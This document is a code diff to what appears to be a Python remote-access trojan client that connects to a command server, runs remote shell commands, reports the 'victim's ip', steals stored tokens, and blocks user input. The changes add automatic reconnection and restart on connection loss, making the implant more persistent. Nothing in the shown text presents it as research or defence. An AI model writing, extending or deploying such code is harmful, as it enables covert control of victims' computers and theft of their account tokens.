@@ -6,9 +6,11 @@ import requests
 import subprocess
 from time import sleep
 import re
+import sys
 
 state = {}
 pcname = socket.gethostname()
+connected = False
 
 def shell(serverSocket, command: str):
 
@@ -109,45 +111,49 @@ def getToken(serverSocket):
         serverSocket.send(bytes("User didn't have any stored tokens", "utf-8"))
 def serverListen(serverSocket):
     while True:
-        msg = serverSocket.recv(1024).decode("utf-8")
-        if msg == "getIP":
-            url = 'http://myexternalip.com/raw'
-            r = requests.get(url)
-            ip = r.text
-            serverSocket.send(b"/messageSend")
-            serverSocket.send(bytes("victim's ip: " + ip, "utf-8"))
+        try:
+            msg = serverSocket.recv(1024).decode("utf-8")
+            if msg == "getIP":
+                url = 'http://myexternalip.com/raw'
+                r = requests.get(url)
+                ip = r.text
+                serverSocket.send(b"/messageSend")
+                serverSocket.send(bytes("victim's ip: " + ip, "utf-8"))
 
-        elif "shell" in msg:
-            command = msg.replace("shell", "")
-            print(command)
-            shell(serverSocket, command)
+            elif "shell" in msg:
+                command = msg.replace("shell", "")
+                print(command)
+                shell(serverSocket, command)
 
-        elif msg == "blockinput":
+            elif msg == "blockinput":
 
-            serverSocket.send(b"/messageSend")
-            serverSocket.send(bytes("Succesfully blocked!", "utf-8"))
+                serverSocket.send(b"/messageSend")
+                serverSocket.send(bytes("Succesfully blocked!", "utf-8"))
 
-        elif msg == "unblockinput":
+            elif msg == "unblockinput":
 
-            serverSocket.send(b"/messageSend")
-            serverSocket.send(bytes("Succesfully unblocked!", "utf-8"))
+                serverSocket.send(b"/messageSend")
+                serverSocket.send(bytes("Succesfully unblocked!", "utf-8"))
 
-        elif msg == "getToken":
+            elif msg == "getToken":
 
-            getToken(serverSocket)
-        else:
-            print(msg)
-
-
-
-
-
-
-
-
+                getToken(serverSocket)
+            else:
+                print(msg)
+        except:
+            print("connection lost")
+            main()
+            break
 def main():
     serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    serverSocket.connect(("localhost", 8000))
+    def connect():
+        try:
+            serverSocket.connect(("localhost", 8000))
+        except:
+            print("connection error trying again in 10 seconds")
+            sleep(10)
+            connect()
+    connect()
     print("Available sessions: ")
     print(serverSocket.recv(1024).decode("utf-8"))
     state["inputCondition"] = threading.Condition()
@@ -178,6 +184,9 @@ def main():
 
 
         serverListenThread.start()
+
+
+
     while True:
         if state["joinDisconnect"]:
             serverSocket.shutdown(socket.SHUT_RDWR)
